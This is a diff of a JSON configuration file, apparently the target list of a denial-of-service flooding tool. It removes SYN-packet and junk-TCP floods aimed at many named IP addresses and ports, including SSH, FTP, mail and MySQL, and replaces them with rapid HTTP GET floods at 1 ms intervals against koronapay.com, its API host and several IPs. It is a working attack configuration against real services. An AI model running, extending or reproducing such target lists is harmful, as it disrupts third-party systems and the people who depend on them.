@@ -1167,244 +1167,87 @@
       }
     },
     {
-      "type": "packetgen",
+      "type": "http",
+      "count": 3,
       "args": {
-        "host": "46.231.215.242",
-        "port": "1194",
-        "packet": {
-          "payload": "{{ random_payload 100 }}",
-          "ethernet": {
-            "src_mac": "{{ random_mac_addr }}",
-            "dst_mac": "{{ random_mac_addr }}"
-          },
-          "ip": {
-            "src_ip": "{{ local_ip }}",
-            "dst_ip": "{{ random_ip }}"
-          },
-          "tcp": {
-            "src_port": "{{ random_port }}",
-            "dst_port": "{{ random_port }}",
-            "flags": {
-              "syn": true
-            }
-          }
+        "request": {
+          "method": "GET",
+          "path": "https://koronapay.com/"
+        },
+        "interval_ms": 1
+      }
+    },
+    {
+      "type": "http",
+      "count": 2,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://koronapay.com/"
+        },
+        "interval_ms": 1
+      }
+    },
+    {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://194.85.18.32/"
+        },
+        "interval_ms": 1
+      }
+    },
+    {
+      "type": "http",
+      "count": 2,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://194.85.18.32/"
+        },
+        "interval_ms": 1
+      }
+    },
+    {
+      "type": "http",
+      "count": 10,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://api.koronapay.com/"
         }
       }
     },
     {
-      "type": "tcp",
+      "type": "http",
+      "count": 10,
       "args": {
-        "address": "94.180.145.12:5251",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
+        "request": {
+          "method": "GET",
+          "path": "http://api.koronapay.com/"
+        }
       }
     },
     {
-      "type": "tcp",
+      "type": "http",
+      "count": 10,
       "args": {
-        "address": "185.10.63.173:22",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
+        "request": {
+          "method": "GET",
+          "path": "https://194.85.18.31/"
+        }
       }
     },
     {
-      "type": "tcp",
+      "type": "http",
+      "count": 10,
       "args": {
-        "address": "185.10.63.173:21",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "tcp",
-      "args": {
-        "address": "185.10.63.173:25",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "tcp",
-      "args": {
-        "address": "185.10.63.173:53",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "tcp",
-      "args": {
-        "address": "185.10.63.173:110",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "tcp",
-      "args": {
-        "address": "185.10.63.173:111",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "tcp",
-      "args": {
-        "address": "185.10.63.173:173",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "tcp",
-      "args": {
-        "address": "185.10.63.173:143",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "tcp",
-      "args": {
-        "address": "185.10.63.173:143",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "tcp",
-      "args": {
-        "address": "185.10.63.173:161",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "tcp",
-      "args": {
-        "address": "185.10.63.173:465",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "tcp",
-      "args": {
-        "address": "185.10.63.173:587",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "tcp",
-      "args": {
-        "address": "185.10.63.173:873",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "tcp",
-      "args": {
-        "address": "185.10.63.173:995",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "tcp",
-      "args": {
-        "address": "185.10.63.173:999",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "tcp",
-      "args": {
-        "address": "185.10.63.173:3306",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "tcp",
-      "args": {
-        "address": "80.93.188.74:22",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "tcp",
-      "args": {
-        "address": "80.93.188.74:22022",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "tcp",
-      "args": {
-        "address": "141.105.69.219:22",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "tcp",
-      "args": {
-        "address": "141.105.69.219:161",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "tcp",
-      "args": {
-        "address": "193.176.76.47:21",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "tcp",
-      "args": {
-        "address": "193.176.76.47:22",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "tcp",
-      "args": {
-        "address": "62.213.104.59:2222",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "tcp",
-      "args": {
-        "address": "62.213.104.60:22",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "tcp",
-      "args": {
-        "address": "79.137.221.91:2222",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
-      }
-    },
-    {
-      "type": "tcp",
-      "args": {
-        "address": "79.137.221.94:2222",
-        "interval_ms": 135,
-        "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg"
+        "request": {
+          "method": "GET",
+          "path": "http://194.85.18.31/"
+        }
       }
     }
   ]
